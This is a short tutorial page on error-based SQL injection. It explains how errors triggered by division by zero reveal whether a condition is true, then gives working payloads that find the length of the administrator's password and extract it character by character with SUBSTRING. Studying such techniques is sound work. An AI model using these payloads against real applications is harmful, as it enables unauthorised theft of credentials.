---
title: Error-based SQL Injection
date: 2025-10-20
description: Introduce the error-based SQL injection.
weight: 2
---

## Principles

An application with this vulnerability may respond differently when submitting invalid or error SQL queries. For example, a such application may return `500` status code when submitting the `1/0` expression.

In this case, it is possible to perform SQL injection by trail-and-error with the response status code.

## Payload

Simply, the payload is:

```text
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a
```

By modifying the condition, we can get more information.

```text
' AND (SELECT CASE WHEN (LENGTH(password) = 1) THEN 1/0 ELSE '' END FROM users WHERE username = 'administrator') || '
```

Then we can get the password length.

After that, we can use `SUBSTRING` function to retrieve the password fully.

```text
' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'a') THEN 1/0 ELSE '' END FROM users WHERE username = 'administrator') || '
```
